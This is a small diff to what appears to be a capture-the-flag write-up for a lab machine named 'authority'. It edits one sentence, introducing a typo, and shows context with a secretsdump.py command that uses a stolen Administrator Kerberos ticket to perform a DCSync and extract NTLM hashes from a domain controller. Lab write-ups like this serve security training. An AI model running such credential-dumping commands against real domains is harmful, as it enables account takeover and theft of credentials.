@@ -702,7 +702,7 @@ Impacket v0.10.1.dev1+20230511.163246.f3d0b9e5 - Copyright 2022 Fortra
 [*] Saving ticket in Administrator.ccache
 ```
 
-We can use the Domain Admin's TGT to request a DCsync and extract their nthash.
+We can use the Administator's TGT to request a DCsync and extract the nthash.
 ```console
 0ph3@parrot~$ KRB5CCNAME=Administrator.ccache secretsdump.py -k -no-pass authority.htb/administrator@authority.authority.htb -just-dc-ntlm
 Impacket v0.10.1.dev1+20230511.163246.f3d0b9e5 - Copyright 2022 Fortra
